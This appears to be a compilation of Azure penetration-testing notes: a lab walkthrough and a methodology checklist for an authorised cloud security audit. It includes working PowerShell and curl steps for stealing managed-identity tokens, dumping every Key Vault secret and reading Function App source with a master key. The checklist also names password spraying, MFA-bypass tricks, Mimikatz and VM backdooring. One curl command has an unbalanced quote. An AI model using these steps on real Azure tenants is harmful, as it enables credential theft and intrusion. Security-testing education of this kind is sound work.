## What is Azure Penetration Testing? [Link](https://www.vaadata.com/blog/azure-penetration-testing-objectives-methodology-and-use-cases/)

An Azure penetration test aims to assess the security of services and resources hosted in an Azure cloud environment.

This type of audit simulates cyber attacks to identify exploitable weaknesses in the infrastructure and configurations of Azure resources, such as virtual machines, databases, web applications and containers.

The aim is to discover potential vulnerabilities, measure their impact and propose corrective measures to strengthen the security of the target system.
## Scope of an Azure Penetration Test

The scope of an Azure penetration test can be adapted to suit the specific needs of your organisation.

It is possible to test all the services and configurations of your Azure infrastructure or to focus on the most critical elements.

Thus, the tests cover (non-exhaustive list):

- Virtual machines: identification of poorly secured services, out-of-date software or configuration errors.
- Databases: un-authorised access, poor permissions management, data leaks, etc.
- Storage services: exposure of sensitive data, poor access management, file share configurations, etc.
- Identity and access management: analysis of roles and permissions, broken access control, etc.
- Hosted web applications and APIs: application vulnerabilities inherent in this type of system (injections, [RCE](https://www.vaadata.com/blog/rce-remote-code-execution-exploitations-and-security-tips/), etc.).
## Recon
1. Determine the azure services used such as application, key vault, cosmos DB, etc.
2. Each services has it's own domain once creates such as application1.azurewebsite.net
3. Tools such as [MicroBurst](https://github.com/NetSPI/MicroBurst) (specific to Azure) or [Cloud Enum](https://github.com/initstring/cloud_enum) (multi-cloud) facilitate this reconnaissance. These tools use dictionaries and apply permutation rules to find services that may belong to the target company.
### Exploiting a command injection on an app
The aim is to recover secrets that can be used to compromise a ‘Service Principal’. This represents the identity of the resource in the tenant.

There are two ways of authenticating with a Service Principal from a compromised application. The first is to find an ‘identifier:secret’ pair in a configuration file. The second involves sending an HTTP request to the **`MSI_ENDPOINT`** using **`IDENTITY_HEADER`** as the secret.

The **`MSI_ENDPOINT`** is the environment where the ‘Managed identities’ service is exposed. This service provides applications with an identity that is automatically managed in Microsoft Entra ID. With this identity, applications can obtain Microsoft Entra tokens without managing identification information. This information is often available in server environment variables.
The first step is to retrieve the environment variables. Since the underlying system is Windows, this can be done with the following command:

```powershell
echo $MSI_ENDPOINT $IDENTITY_ENDPOINT
```
We now have everything we need to compromise the application’s Service Principal.

To do this, we simply need to run the following command on the underlying system:

```powershell
curl $MSI_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

This command sends an HTTP request to the ‘managed identities’ service and retrieves a [JWT](https://www.vaadata.com/blog/jwt-tokens-and-security-working-principles-and-use-cases/) associated with the application’s Service Principal.

We can then use this JWT and the privileges associated with the account to move laterally in the Azure infrastructure.

### Retrieving the secrets of the Key Vault

Let’s start by listing the resources accessible by our application’s Service Principal, using the following powershell code:

```powershell
# Connection with the compromise Web app account
$access_token = "<access_token_management>"
Connect-AzAccount -AccessToken $access_token -AccountId 02861316-6d42-4d55-b2f7-542af2fb9915
Get-AzResource
```

So we can see that we can access a Key Vault named ‘keyvaultvaadatalab1’.
A Key Vault is a service for centralising and storing passwords, connection strings, certificates, secret keys and so on. It also simplifies the management of application secrets and allows integration with other Azure services.

So it’s a safe bet that sensitive information is stored in this Key Vault. But having access to a resource does not mean that you can do everything with it. Azure (like other cloud services) offers a high level of granularity in terms of the permissions that can be given to one resource over another.

We therefore need to list the permissions we have on the Key Vault. This can be done using the following powershell code:

```powershell
$access_token = "<access_token_management>"
Connect-AzAccount -AccessToken $access_token -AccountId 02861316-6d42-4d55-b2f7-542af2fb9915
$KeyVault = Get-AzKeyVault
$Token = (Get-AzAccessToken).Token
$SubscriptionID = (Get-AzSubscription).Id
$ResourceGroupName = $KeyVault.ResourceGroupName
$KeyVaultName = $KeyVault.VaultName
$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token"
    }
}

(Invoke-RestMethod @RequestParams).value
```

This script queries the Azure Management REST API to retrieve the privileges that the ‘staging-vaadatalab’ application has on the ‘keyvaultvaadatalab1’ Key Vault.
#### Actions

Actions define the operations that the client is authorised to perform on a resource.

In our case, the action specified is **`Microsoft.KeyVault/vaults/read`**; this means that the user has the right to read the metadata of an Azure Key Vault. This generally includes operations such as retrieving information about the vault (name, location, tags, etc).
#### DataActions

DataActions are actions specific to the data in the key vault. They define the operations authorised on the secrets and keys stored in the key vault. In this example, 4 dataActions are defined:

- **`Microsoft.KeyVault/vaults/keys/read`**: Allows the metadata of keys stored in the vault to be read.
- **`Microsoft.KeyVault/vaults/keys/decrypt/action`**: Allows the keys stored in the vault to be decrypted.
- **`Microsoft.KeyVault/vaults/secrets/readMetadata/action`**: Allows the metadata of secrets stored in the key vault to be read.
- **`Microsoft.KeyVault/vaults/secrets/getSecret/action`**: Authorises the recovery of secret values stored in the key vault.
#### Retrieving the secrets

This will allow us to retrieve the value of all the secrets in the Key Vault and analyse what we can do with them.

But first, we need to retrieve another specific **`access_token`** to perform actions on the data in the Key Vault.

To do this, we again exploit code injection on the application to retrieve an **`access_token`** with the following command:

```powershell
curl "<MSI_ENDPOINT>?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:"IDENTITY_HEADER"
```

We can now list all the secrets in the Key Vault using the following PowerShell script:

```powershell
# List all secrets in the keyvault
$access_token = "<access_token_management>"
$keyvault_access_token = "<access_token_keyvault>"
Connect-AzAccount -AccessToken $access_token -KeyVaultAccessToken $keyvault_access_token -AccountId 3329fea7-642e-4c09-b1ad-d8edbe140267

$KeyVault = Get-AzKeyVault
$SubscriptionID = (Get-AzSubscription).Id
$ResourceGroupName = $KeyVault.ResourceGroupName
$KeyVaultName = $KeyVault.VaultName

$secrets = Get-AzKeyVaultSecret -VaultName $keyVaultName

foreach ($secret in $secrets) {
    $secretName = $secret.Name
    $secretValue = (Get-AzKeyVaultSecret -VaultName $keyVaultName -Name $secretName -AsPlainText)
    Write-Output "$secretName : $secretValue"
} 
```

### Reading the Function App source code

One of the secrets is called **`host-masterkey-master`**. This is very reminiscent of the ‘master key’ of a Function App.
Azure Functions is a serverless solution that allows less infrastructure to be managed and saves on costs. Instead of worrying about deploying and maintaining servers, Azure provides all the up-to-date resources needed to keep applications running.

Each Function App has a masterkey that enables administrative actions to be performed, such as reading the source code of the Function App, adding code, and so on.

We can therefore test this masterkey on the ‘vaadatalabprod’ function App discovered during the reconnaissance phase in order to access the source code of the various functions.
To do this, we can query the function App’s virtual storage space (VFS) via the endpoint **`https://<function-app>.azurewebsites.net/admin/vfs/home/site/wwwroot/`**.

The following PowerShell code is used to perform this action:

```powershell
$URL = "https://vaadatalabprod.azurewebsites.net/admin/vfs/home/site/wwwroot/"

$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "<master-key>"

}

}

Invoke-RestMethod @Params -UseBasicParsing
```

The result is the list of functions, which means that the masterkey is indeed that of the ‘vaadatalabprod’ Function App.

Now it’s time to read the source code of the functions, looking for secrets for example.

At this stage, it is also possible to add a function that contains arbitrary code. This can be used to drop code to retrieve an **`access_token`** in order to compromise the main service of the ‘vaadatalabprod’ Function App; and to repeat the analysis of resources accessible by the Function App to potentially compromise other resources.
### Compromising the database

Let’s take a closer look at the accessed application source code file and find a way to access the DB with the hardcoded connection strings in the application source code.
## References
- [https://hackingthe.cloud/azure/](https://hackingthe.cloud/azure/abusing-managed-identities/)  
- [https://github.com/dafthack/CloudPentestCheatsheets](https://github.com/dafthack/CloudPentestCheatsheets)  
- [https://cloud.hacktricks.xyz/pentesting-cloud/azure-security](https://cloud.hacktricks.xyz/pentesting-cloud/azure-security)  
- [https://attack.mitre.org/matrices/enterprise/cloud/azuread/](https://attack.mitre.org/matrices/enterprise/cloud/azuread/)  
- [https://attack.mitre.org/matrices/enterprise/cloud/](https://attack.mitre.org/matrices/enterprise/cloud/)

# Medium Blog Content
---
## External Attack Surface Visibility (Unauthenticated Testing)
### OSINT

- Do an general OSINT on the target organization. Example test cases here is to utilized dump databases such as from Dehashed, look for list of possible users/emails that belong to the target company, perform Google Dorking for Github repo that may belong to the target org.
#### Check in high level the Azure services that the client uses. I could use MicroBurst or similar tools to do this.

- _Invoke-EnumerateAzureSubDomains -Base <_**_name of the company/target domain here_**_> -Verbose_
#### Check for domains or subdomains ( subinder, dnsx, httpx) that have Websites/Web Apps running
- Look for web app vulnerabilities such as SQLI, SSRF, Command Injection, XXE, Arbitrary File Upload, etc,
- The goal is to identify vulnerabilities that enable potential RCE on Azure VMs hosting vulnerable web apps or Azure Functions, and exploit credentials or SAS tokens to pivot deeper into the Azure infrastructure. In this part, I would do a manual and automated testing (such a using Nuclei, among other tools ).
- I always enable Trufflehog browser extension while browsing the web app to possibly get keys.
#### Domain dangling
- Look for possible domain dangling on the target org ( CNAME is active but its pointing to a non existent service (deleted azure blobs, deleted Heroku instance, etc)
#### Perform Network Scans
- I would do a subdomain enum here using Sublister or Dnsx, scan the result using Naabu, Nmap, Masscan, etc. I would also use Gowitness if that are a lot hosts/web apps
- Pay attention to interesting services like databases ( exposed MongoDb, Redis, Memcached, etc)
#### Check for exposed git repos
- Goal is to get exposed creds and or SAS Tokens, API keys, among others.
#### Exposed storage/Azure blobs
- Check for exposed or anonymous Azure blob access. Verify if this is intended. Look for possible sensitive info.
- I would use GrayHatWarFare, Cloud_enum or similar tools for this use case.
#### Password Attacks
- Password Spraying
- After getting a list of users. Check what are valid users. Do a password spray on the valid users.
#### Conditional Access and or MFA Bypass test cases
- If you have creds, as a result of password spraying ( if successful :) ), determine if MFA is enabled.
- Try save the creds in a variable, these may sometimes bypass MFA
- $credential = Get-Credential  
    Connect-AzAccount -Credential $credential
- Try to change User Agent strings ( later you can revisit this, when you have Roadrecon results when you use “ roadrecon plugin policies “

**Authenticated Testing**
In Gray box testing, I normally ask for two types of credentials. One with a Reader access / Reader account to the Azure Tenant and to the specific Subscriptions that are in scope. Another user with a higher privileged. Note, there is a consensus that Black box approach in any Cloud Pentest engagement is not really recommended since its very risky ( imagine hitting an IP address that doesn't belong to your target org :) ) .

 Do an internal or authenticated recon using the low and high privileged user

 My flow is get the Users, Roles, Resource Groups, Services

 I would then generally approach my testing per Services/type of resources on the tenant.

**Services/Resources:**
 **VMs**
- Check if the role given has Owner, Contributor or Custom role ( for example, Microsoft.Compute/virtualMachines/runCommand/action). You might have permission to run commands on the VMs. If yes, try to run commands ( make sure that client has given you a green light :)
- Check if VMs have Custom Script Extension enabled ( read more on how to leverage this of priv esc or command execution on the VM)
- When you are in a VM, if possible run Mimikatz, look for Azure auth tokens, sensitive data, look for other network that the VM is connected, etc
- In VMs/Desktops, other notable things to check are .cspkg files, .publishsettings files, Keys from Storage Explorers, Web Config and App Config files, check the command history.
- When you are in a VM already, and/or you confirmed separately using az cli or Azure Portal that Managed Identities ( User-assigned/Systems-assigned ) are used in VMs, check for the Metadata ( similar when you check the IMDSv1/IMDSv2 in AWS). Reuse the Managed Identity with ScoutSuite, Roadrecon, Azurehound, etc.
- When you are in a VM already, and if hybrid setup, look for PRT

 **Network**
- Check for internal IPs
- Check the Network Security Group ( incoming RDP/other services from all IPs allowed? Is this intended ? Tools such as ScoutSuite or Prowler can automate the tasks but you can also do this in Azure Portal/az cli, etc.
- In services/servers such as SQL Server, check the Security > Networking then the “Firewall rules” section. There is a feature, which is off by default as per Microsoft, that says “ Allow azure services and resources to access this server”. This is basically a firewall rule exemption that allows connections from ALL IPs allocated to all Azure services including those that are coming from Subscriptions of other customers. Ensure that this is disabled, unless there is a good business use case and risks are accepted.

 **Storage (VHD)**
- Check if you have permission to create snapshots or backup disks.
- If yes, snapshot it, download the disk then forensicate manually. If with appropriate permission in the tenant, you may spin up a VM, then attach the disk. You may also backdoor a VM through the disk.
- If with permission to mount disk try to use Dism to add files, add roles, set scheduled tasks, etc,

 **Storage (Blobs)**
- Check all the Storage accounts, check if there are blobs or containers under those accounts that allows anonymous access. If yes, browse it from outside ( sometimes, Storage accounts set up by org can be very random and you cant bruteforce them from outside)
- If you got an STS , review if it has too much permission for a blob ( check for the value of “**sp**”)

 **Database**
- Check what database is used ( CosmosDB?), It can be accessed using the Read Only Key(CosmosDB endpoint can be accessed using a connection string or and an Entra ID user that has a privilege to access the instance).

 **Cloud Shell**
- Check if your user has storage account contributor permission; this can enumerate storage accounts used for Cloud Shell. We can try to steal tokens or deploy a backdoor

 **KeyVaults**
- Check if client uses KeyVaults, check your permission, if you have Owner, Contributor or custom role. If Contributor, you can change your permission to give you access to the KeyVaults

 **Runbooks/Automation Accounts**
- Check if your user has Azure Automation Accounts and / or Automation Account Hybrid Workers permission / if has permission to read/create Runbooks

 **Function Apps**
- Check if client deploys Function apps. Perform abuse on Function apps.

 **Logic Apps**
- Check if client deploys Logic apps. Perform abuse on Logic apps.

 **ACR**
- Check if client uses ACR, check your permission. Read more on possible Priv esc scenario using ACR

 **IAM**
- Check for Managed Identities for possible priv esc
- Check for dynamic group (Misconfigured Dynamic Rules)
- Security Groups, Check if default users are allowed to create Security Groups. best practice to disable it
- App Consent, Check if default users are allowed to consent apps ( read more on app consent phishing if your are not familiar with it )
- Guest user. Check if guest user invite is set to default, depending on the business use case, client may choose the most restrictive option.

 **Other post recon activities**
- Utilize Roadtools/Roadrecon to get more details on the subscriptions
- Check for conditional access policies, among other things
- For priv esc, utilize Azurehound. Also, check if your permission has a Contributor or Owner permission on each service available. If yes, try to escalate and do the recon again.

 **Primary tools:**
- PowerShell
- az cli
- AADInternals
- MicroBurst
- PowerZure
- cloud_enum
- ScoutSuite
- Prowler
- Roadrecon
- Azurehound

**References:**
- [https://hackingthe.cloud/azure/abusing-managed-identities/](https://hackingthe.cloud/azure/abusing-managed-identities/)  
- [https://github.com/dafthack/CloudPentestCheatsheets](https://github.com/dafthack/CloudPentestCheatsheets)  
- [https://cloud.hacktricks.xyz/pentesting-cloud/azure-security](https://cloud.hacktricks.xyz/pentesting-cloud/azure-security)  
- [https://attack.mitre.org/matrices/enterprise/cloud/azuread/](https://attack.mitre.org/matrices/enterprise/cloud/azuread/)  
- [https://attack.mitre.org/matrices/enterprise/cloud/](https://attack.mitre.org/matrices/enterprise/cloud/)

## [Awesome Azure Pen-test](https://github.com/Kyuu-Ji/Awesome-Azure-Pentest)
